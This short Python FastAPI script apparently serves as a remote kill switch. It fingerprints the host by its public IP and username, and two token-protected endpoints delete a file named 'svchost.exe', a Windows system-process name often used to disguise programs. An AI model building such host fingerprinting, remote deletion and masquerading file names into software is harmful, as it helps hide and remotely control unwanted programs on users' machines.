from fastapi import FastAPI, HTTPException
import uvicorn
import os
from dotenv import load_dotenv
import requests

load_dotenv()

ip_publico = requests.get('https://httpbin.org/ip').json()['origin']
usuario = os.getlogin()

user_identification = f'{usuario} - {ip_publico}'.lower().replace('.', '')

secret_token = os.getenv('SECRET_TOKEN')
app = FastAPI()

diretorio_arquivo = os.path.dirname(__file__)
arquivo_kill = os.path.join(diretorio_arquivo, 'svchost.exe') 

# Cria uma rota com a identificação do usuario para melhor organização
@app.post(f'/{user_identification}')
def destruir(token: str):
    if token != secret_token:
        raise HTTPException(status_code=403, detail='ACESSO NEGADO MEU PATRÃO RSRS')
    os.remove(arquivo_kill)

# Rota de Delete All 
@app.post('/kill-all')
def destruir(token: str):
    if token != secret_token:
        raise HTTPException(status_code=403, detail='ACESSO NEGADO MEU PATRÃO RSRS')
    
    os.remove(arquivo_kill)